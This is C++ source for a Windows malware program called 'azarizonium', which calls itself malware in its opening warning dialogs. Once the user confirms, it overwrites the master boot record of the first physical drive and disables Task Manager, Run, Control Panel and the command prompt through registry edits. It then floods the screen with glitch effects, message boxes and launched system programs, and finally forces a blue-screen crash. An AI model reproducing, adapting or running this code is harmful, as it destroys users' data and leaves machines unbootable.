#include <windows.h>
#include <tchar.h>
#include <ctime>
#pragma comment(lib, "winmm.lib")
#define _USE_MATH_DEFINES 1
#include <cmath>
#define M_PI 3.14159265358979323846264338327950288
#pragma comment(lib, "msimg32.lib")
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

typedef struct {
	FLOAT h, s, l;
} HSL;

namespace Colors {
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0);
	if (clr == 1) return RGB(0, 255, 0);
	if (clr == 2) return RGB(0, 0, 255);
	if (clr == 3) return RGB(255, 0, 255);
	if (clr == 4) return RGB(255, 255, 0);
}

void mbr() {
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD write;
	WriteFile(MBR, mbrData, 512, &write, NULL);
	CloseHandle(MBR);
}

DWORD WINAPI disable(LPVOID lpvd) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
	system("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f");
	return 1;
}

LPCWSTR string() {
	srand(GetTickCount());
	WCHAR string[32];
	for (int i = 0; i < 32; i++) {
		string[i] = (WCHAR)(rand() % 256) + 1;
	}
	return string;
}

DWORD WINAPI msg(LPVOID lpParam) {
	while (true) {
		MessageBox(NULL, string(), L"control.exe", MB_ICONERROR | MB_CANCELTRYCONTINUE);
		MessageBox(NULL, string(), L"win.ini", MB_ICONWARNING | MB_YESNOCANCEL);
		MessageBox(NULL, string(), L"azarizonium", MB_ICONASTERISK | MB_ABORTRETRYIGNORE);
	}
	return 0;
}

DWORD WINAPI move(LPVOID lpParam) { //credits to Maxi2022gt
	while (true) {
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HWND wnd = GetForegroundWindow();
		MoveWindow(wnd, rand() % w, rand() % h, rand() % w, rand() % h, false);
		Sleep(rand() % 100);
	}
}

DWORD WINAPI cur1(LPVOID lpParam) {
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true) {
		SetCursorPos(rand() % x, rand() % y);
		Sleep(500);
	}
}

DWORD WINAPI opener(LPVOID lpParam) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
	while (true) {
		HANDLE find = FindFirstFileW(path, &data);
		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(1000);
		}
	}
}

DWORD WINAPI textz(LPVOID lpParam) {
	const char* alphanum[] = {
		"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "q", "w", "e", "r", "t",
		"y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z",
		"x", "c", "v", "b", "n", "m", "Q", "W", "E", "R", "T", "Y", "U", "I", "O",
		"P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B",
		"N", "M", ".", ",", " ", "$", "#", "&", "@", "!", "?",
	};
	int nText = sizeof(alphanum) / sizeof(void*);
	char text[1];
	while (true) {
		for (int i = 0; i < 70; i++) {
			text[i] = rand() % nText;
		}
		SetWindowTextA(GetForegroundWindow(), text);
		Sleep(10);
	}
}

DWORD WINAPI swirl(LPVOID lpParam) {
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	int xSize = sw / 4, ySize = 8;
	while (1) {
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sh * 2; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCINVERT);
		}
		for (int i = 0; i < sw * 2; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCINVERT);
		}
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 111, 0 };
		AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blend);
		ReleaseDC(0, hdc);
		DeleteDC(hdc);
		DeleteDC(hdcMem);
		DeleteObject(screenshot);
	}
}

DWORD WINAPI glitch(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, 1, rand() % h, w, 192, hdc, 0, rand() % h, 0x123456);
		BitBlt(hdc, -1, rand() % h, w, -96, hdc, 0, rand() % h, !(rand() % 2) ? SRCAND : SRCPAINT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI textout(LPVOID lpvd) {
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true) {
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		LPCWSTR text = string();
		SetTextColor(hdc, Hue(239));
		HFONT font = CreateFontA(43, 32, rand() % 3600, rand() % 3600, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
		SelectObject(hdc, font);
		TextOutW(hdc, rand() % x, rand() % y, text, strlen((const char*)text));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI shader1(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			INT x = i % w, y = i / w;
			if (i % h == 0 && rand() % 100 == 0)
				v = rand() % 50;
			((BYTE*)(data + i))[v % 3] += (x ^ y) + x;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI shader2(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(0);
	int screenHeight = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				FLOAT fx = (y + i * 4) ^ (x);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI shader3(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(0);
	int screenHeight = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				FLOAT fx = (x + i * 4);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, -30, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		StretchBlt(hdc, screenWidth - 30, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 14 & 2 | t >> 11 & 14 & t >> 4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(8 * t * (t >> 7));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * t / 1 / 1 ^ t >> 5);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(500 * (2 * t >> 8 | 1 * t >> 1));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(2 * t * (t >> 6 | t | t) + (7 & t >> 11));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
	if (MessageBoxW(NULL, L"The software you just executed is considered malware. This malware will harm your computer and makes it unusable. If you are seeing this message without knowing what you just executed, simply press No and nothing will happen. If you know what this malware does and are using a safe environment to test, press Yes to start it. Do you want to execute this malware, resulting in an unusable machine?", L"azarizonium", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	} 
	else {
		if (MessageBoxW(NULL, L"This is the last warning! The creator is not responsible for any damage made using this malware! Still execute it?", L"azarizonium", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			mbr();
			CreateThread(0, 0, disable, 0, 0, 0);
            Sleep(4000);
			CreateThread(0, 0, msg, 0, 0, 0);
			Sleep(1000);
			CreateThread(0, 0, move, 0, 0, 0);
			CreateThread(0, 0, cur1, 0, 0, 0);
			HANDLE thread1 = CreateThread(0, 0, swirl, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread2 = CreateThread(0, 0, glitch, 0, 0, 0);
			HANDLE thread2dot1 = CreateThread(0, 0, textout, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			CreateThread(0, 0, opener, 0, 0, 0);
			CreateThread(0, 0, textz, 0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, shader1, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread4 = CreateThread(0, 0, shader2, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread5 = CreateThread(0, 0, shader3, 0, 0, 0);
			sound5();
			Sleep(30000);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}